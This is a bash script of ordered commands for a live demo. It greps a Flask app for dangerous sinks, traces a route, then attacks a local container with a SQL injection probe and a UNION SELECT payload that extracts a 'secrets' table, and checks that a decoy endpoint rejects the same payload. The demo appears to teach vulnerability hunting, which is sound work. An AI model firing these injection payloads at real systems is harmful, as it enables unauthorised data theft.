#!/usr/bin/env bash
# The exact commands for the live demo, in order. Copy-paste from here, never from memory.
# Run from the repo root with the container up on :5001.
B="${FLASK:-http://localhost:5001}"
run() { printf '\n\033[1;33m$ %s\033[0m\n' "$*"; eval "$@"; }

echo "### 1. GREP: find the sinks"
run 'grep -rnE "subprocess|\.execute\(|open\(|render_template_string|requests\.get" --include=*.py flask_app/'

echo; echo "### 2. GREP: who calls the wrappers?"
run 'grep -rnE "run_cmd|read_doc|get_user" --include=*.py flask_app/'

echo; echo "### 3. TRACE: the route (source)"
run 'grep -n -A3 "route(\"/user\")" flask_app/app.py'

echo; echo "### 4. PWN: probe"
run "curl -s \"$B/user?id=1'\" | head -c 300"

echo; echo; echo "### 5. PWN: extract"
run "curl -s \"$B/user?id=1%20UNION%20SELECT%20id,name,value%20FROM%20secrets\""

echo; echo; echo "### 6. The decoy dies"
run "curl -s -o /dev/null -w '%{http_code}\n' \"$B/order?id=1%20UNION%20SELECT%201,2,3\""
